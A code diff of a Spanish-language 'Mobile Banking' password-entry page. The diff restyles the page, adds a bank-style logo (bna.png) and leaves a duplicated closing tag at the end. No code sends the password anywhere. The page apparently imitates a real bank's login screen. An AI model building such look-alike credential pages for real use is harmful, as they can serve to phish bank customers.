@@ -1,48 +1,53 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ingrese su clave</title>
+    <title>Mobile Banking</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
 
-<header class="top-bar center">
-    <div class="title">Mobile Banking</div>
-</header>
+    <!-- Header superior -->
+    <header class="top-bar">
+        <div class="title">Mobile Banking</div>
+    </header>
 
-<div class="login-card clave-card">
-    <div class="login-title">Ingrese su clave</div>
-
-    <div class="clave-row">
-        <input type="password">
-        <img src="captcha.png" class="captcha">
+    <!-- Logo (MISMO QUE INDEX) -->
+    <div class="logo-container">
+        <img src="bna.png" alt="Logo">
     </div>
 
-    <div class="btn-row">
+    <!-- Card login -->
+    <div class="login-card">
+        <div class="login-title">Ingresá tu clave</div>
+
+        <input type="password" placeholder="">
+
         <button class="btn-accept">
             <span class="check">✔</span>
             Aceptar
         </button>
 
-        <button class="btn-back" onclick="volver()">
-            ↩ Volver
+        <button class="btn-accept" onclick="volver()" style="margin-bottom:16px;">
+            Volver
         </button>
     </div>
-</div>
 
-<footer class="footer">
-    <span class="close">✖</span>
-    <p>Salir</p>
-</footer>
+    <!-- Footer -->
+    <footer class="footer">
+        <span class="close">✖</span>
+        <p>Salir</p>
+    </footer>
 
-<script>
-function volver() {
-    window.location.href = "index.html";
-}
-</script>
+    <script>
+        function volver() {
+            window.location.href = "index.html";
+        }
+    </script>
+
+</body>
+</html>
 
 </body>
 </html>
